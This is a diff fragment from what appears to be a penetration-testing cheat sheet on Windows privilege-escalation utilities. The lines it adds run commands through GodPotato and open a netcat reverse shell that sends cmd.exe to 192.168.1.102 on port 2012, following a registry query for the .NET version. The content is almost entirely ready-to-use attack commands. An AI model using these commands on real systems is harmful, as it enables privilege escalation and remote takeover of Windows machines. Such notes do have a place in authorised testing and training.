@@ -9,6 +9,12 @@
 ```powershell
 # check NET version
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+
+# run commands
+GodPotato.exe -cmd "cmd /c whoami"
+
+# reverse shell
+GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
 
 # Utils: PrintSpoofer
